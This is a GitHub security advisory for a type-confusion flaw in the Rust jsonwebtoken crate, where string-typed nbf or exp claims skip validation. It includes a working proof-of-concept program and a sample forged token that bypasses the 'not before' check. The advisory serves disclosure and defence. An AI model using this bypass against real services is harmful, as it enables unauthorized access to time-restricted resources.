# [M] jsonwebtoken has Type Confusion that leads to potential authorization bypass

## Summary
Severity: Medium
Advisory: GHSA-h395-gr6q-cpjc
CVE: CVE-2026-25537
CWE: CWE-843
Ecosystem: crates.io
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-02-03
Source: https://github.com/advisories/GHSA-h395-gr6q-cpjc
Type: github-advisory

## Affected
- crates.io: `jsonwebtoken` — affected >=0 <10.3.0

## Details
## Summary:

It has been discovered that there is a Type Confusion vulnerability in jsonwebtoken, specifically, in its claim validation logic.

When a standard claim (such as nbf or exp) is provided with an incorrect JSON type (Like a String instead of a Number), the library’s internal parsing mechanism marks the claim as “FailedToParse”. Crucially, the validation logic treats this “FailedToParse” state identically to “NotPresent”.

This means that if a check is enabled (like: validate_nbf = true), but the claim is not explicitly marked as required in required_spec_claims, the library will skip the validation check entirely for the malformed claim, treating it as if it were not there. This allows attackers to bypass critical time-based security restrictions (like “Not Before” checks) and commit potential authentication and authorization bypasses.

## Details:

The vulnerability stems from the interaction between the TryParse enum and the validate function in [src/validation.rs](https://github.com/Keats/jsonwebtoken/blob/master/src/validation.rs).

 1. The TryParse Enum: The library uses a custom TryParse enum to handle claim deserialization:
```
enum TryParse<T> {
    Parsed(T),
    FailedToParse, // Set when deserialization fails (e.g. type mismatch)
    NotPresent,
}
```
If a user sends {“nbf”: “99999999999”} (legacy/string format), serde fails to parse it as u64, and it results in TryParse::FailedToParse.

 1. The Validation Logic Flaw (src/validation.rs): In Validation::validate, the code checks for exp and nbf
like this:
```
// L288-291
if matches!(claims.nbf, TryParse::Parsed(nbf) if options.validate_nbf && nbf > now + options.leeway) {
    return Err(new_error(ErrorKind::ImmatureSignature));
}
```
This matches! macro explicitly looks for TryParse::Parsed(nbf).

 • If claims.nbf is FailedToParse, the match returns false.
 • The if block is skipped.
 • No error is returned.
 1. The “Required Claims” Gap: The only fallback mechanism is the “Required Claims” check:
```
// Lines 259-267
for required_claim in &options.required_spec_claims {
    let present = match required_claim.as_str() {
        "nbf" => matches!(claims.nbf, TryParse::Parsed(_)),
        // ...
    };
    if !present { return Err(...); }
}
```
If “nbf” IS in required_spec_claims, FailedToParse will fail the matches!(..., Parsed(_)) check, causing the present to be false, and correctly returning an error.

However, widely accepted usage patterns often enable validation flags (validate_nbf = true) without adding the claim to the required list, assuming that enabling validation implicitly requires the claim’s validity if it appears in the token. jsonwebtoken seems to violate this assumption.

Environment:

 • Version: jsonwebtoken 10.2.0
 • Rust Version: rustc 1.90.0
 • Cargo Version: cargo 1.90.0
 • OS: MacOS Tahoe 26.2

POC:

For demonstrating, Here is this simple rust code that demonstrates the bypass. It attempts to validate a token with a string nbf claiming to be valid only in the far future.

create a new project:
```
cargo new nbf_poc; cd nbf_poc
```
add required dependencies:
```
cargo add serde --features derive
cargo add jsonwebtoken --features rust_crypto
cargo add serde_json
```
replace the code in src/main.rs with this:

```
use jsonwebtoken::{decode, Validation, Algorithm, DecodingKey, Header, EncodingKey, encode};
use serde::{Deserialize, Serialize};

#[derive(Debug, Serialize, Deserialize)]
struct Claims {
    sub: String,
    nbf: String, // Attacker sends nbf as a String
    exp: usize,
}
fn main() {
    let key: &[u8; 24] = b"RedMouseOverTheSkyIsBlue";

    // nbf is a String "99999999999" (Far future)
    // Real nbf should be a Number.
    let my_claims: Claims = Claims {
        sub: "krishna".to_string(),
        nbf: "99999999999".to_string(), 
        exp: 10000000000, 
    };

    let token: String = encode(&Header::default(), &my_claims, &EncodingKey::from_secret(key)).unwrap();
    println!("Forged Token: {}", token);

    // 2. Configure Validation
    let mut validation: Validation = Validation::new(Algorithm::HS256);
    validation.validate_nbf = true; // Enable NBF check

    // We do NOT add "nbf" to required_spec_claims (default behavior)

    // We decode to serde_json::Value to avoid strict type errors in our struct definition hiding the library bug.
    // The library sees the raw JSON with string "nbf".
    let result: Result<jsonwebtoken::TokenData<serde_json::Value>, jsonwebtoken::errors::Error> = decode::<serde_json::Value>(
        &token, 
        &DecodingKey::from_secret(key), 
        &validation
    );

    match result {
        Ok(_) => println!("Token was accepted despite malformed far-future 'nbf'!"),
        Err(e) => println!("Token rejected. Error: {:?}", e),
    }
}
```
run cargo run

expected behaviour:

```
Forged Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJrcmlzaG5hIiwibmJmIjoiOTk5OTk5OTk5OTkiLCJleHAiOjEwMDAwMDAwMDAwfQ.Fm3kZIqMwqIA6sEA1w52UOMqqnu4hlO3FQStFmbaOwk
```
Token was accepted despite malformed far-future 'nbf'!
Impact:

If an application uses jsonwebtoken nbf (Not Before) to schedule access for the future (like “Access granted starting tomorrow”).

By sending nbf as a string, an attacker can bypass this restriction and access the resource immediately.

and for the exp claim (this is unlikely but still adding), If a developer sets validate_exp = true but manually handles claim presence (removing exp from required_spec_claims), an attacker can send a string exp (e.g., “never”) and bypass expiration checks entirely. The token becomes valid forever.

## References
- https://github.com/Keats/jsonwebtoken/security/advisories/GHSA-h395-gr6q-cpjc
- https://nvd.nist.gov/vuln/detail/CVE-2026-25537
- https://github.com/Keats/jsonwebtoken/commit/abbc3076742c4161347bc6b8bf4aa5eb86e1dc01
- https://github.com/Keats/jsonwebtoken
